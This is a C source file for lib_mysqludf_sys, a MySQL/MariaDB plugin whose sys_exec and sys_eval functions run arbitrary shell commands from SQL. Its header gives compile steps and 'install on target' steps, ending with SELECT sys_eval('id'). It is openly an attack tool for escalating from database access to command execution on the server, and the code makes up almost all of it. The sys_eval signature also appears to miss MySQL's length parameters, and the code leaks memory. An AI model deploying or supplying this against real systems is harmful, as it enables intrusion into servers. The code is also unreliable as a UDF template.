/*
 * lib_mysqludf_sys - MySQL/MariaDB UDF for OS command execution.
 *
 * Exposes two SQL-callable functions:
 *   sys_exec(cmd)  -> int     exit code of the command
 *   sys_eval(cmd)  -> string  stdout of the command
 *
 * Compile:
 *     gcc -shared -fPIC -O2 -o lib_mysqludf_sys.so lib_mysqludf_sys.c
 *
 * Install on target:
 *     (write .so to @@plugin_dir)
 *     CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 *     CREATE FUNCTION sys_eval RETURNS STRING  SONAME 'lib_mysqludf_sys.so';
 *
 * Use:
 *     SELECT sys_eval('id');
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

typedef char my_bool;

typedef struct st_mysql_udf_init {
    unsigned int argc;
    char       **argv;
    char        *message;
    void        *ptr;
} MYSQL_UDF_INIT;

typedef struct st_mysql_udf_args {
    unsigned int   arg_count;
    int           *arg_type;
    char         **args;
    unsigned long *lengths;
    char          *maybe_null;
    char         **attributes;
    unsigned long *attribute_lengths;
} MYSQL_UDF_ARGS;

/* ---- sys_exec ---------------------------------------------------- */

my_bool sys_exec_init(MYSQL_UDF_INIT *initid,
                       MYSQL_UDF_ARGS *args,
                       char *message)
{
    (void)initid;
    (void)args;
    (void)message;
    return 0;
}

void sys_exec_deinit(MYSQL_UDF_INIT *initid)
{
    (void)initid;
}

long long sys_exec(MYSQL_UDF_INIT *initid,
                    MYSQL_UDF_ARGS *args,
                    char *is_null,
                    char *error)
{
    (void)initid;
    (void)is_null;
    (void)error;

    if (args->arg_count != 1) {
        return -1;
    }

    char cmd[8192];
    unsigned long len = args->lengths[0];
    if (len >= sizeof(cmd)) {
        len = sizeof(cmd) - 1;
    }
    memcpy(cmd, args->args[0], len);
    cmd[len] = '\0';

    return (long long)system(cmd);
}

/* ---- sys_eval ---------------------------------------------------- */

my_bool sys_eval_init(MYSQL_UDF_INIT *initid,
                       MYSQL_UDF_ARGS *args,
                       char *message)
{
    (void)initid;
    (void)args;
    (void)message;
    return 0;
}

void sys_eval_deinit(MYSQL_UDF_INIT *initid)
{
    (void)initid;
}

static char *exec_and_capture(const char *cmd, unsigned long *out_len)
{
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        *out_len = 0;
        return NULL;
    }

    size_t cap = 4096;
    size_t used = 0;
    char *buf = (char *)malloc(cap);
    if (!buf) {
        pclose(fp);
        *out_len = 0;
        return NULL;
    }

    size_t n;
    while ((n = fread(buf + used, 1, cap - used - 1, fp)) > 0) {
        used += n;
        if (used >= cap - 1) {
            cap *= 2;
            char *nb = (char *)realloc(buf, cap);
            if (!nb) {
                free(buf);
                pclose(fp);
                *out_len = 0;
                return NULL;
            }
            buf = nb;
        }
    }

    pclose(fp);
    buf[used] = '\0';
    *out_len = (unsigned long)used;
    return buf;
}

char *sys_eval(MYSQL_UDF_INIT *initid,
                MYSQL_UDF_ARGS *args,
                char *is_null,
                char *error)
{
    (void)initid;
    (void)error;

    if (args->arg_count != 1) {
        return NULL;
    }

    char cmd[8192];
    unsigned long len = args->lengths[0];
    if (len >= sizeof(cmd)) {
        len = sizeof(cmd) - 1;
    }
    memcpy(cmd, args->args[0], len);
    cmd[len] = '\0';

    unsigned long out_len = 0;
    char *out = exec_and_capture(cmd, &out_len);
    if (!out) {
        return NULL;
    }

    if (is_null) {
        *is_null = 0;
    }

    (void)out_len;
    return out;
}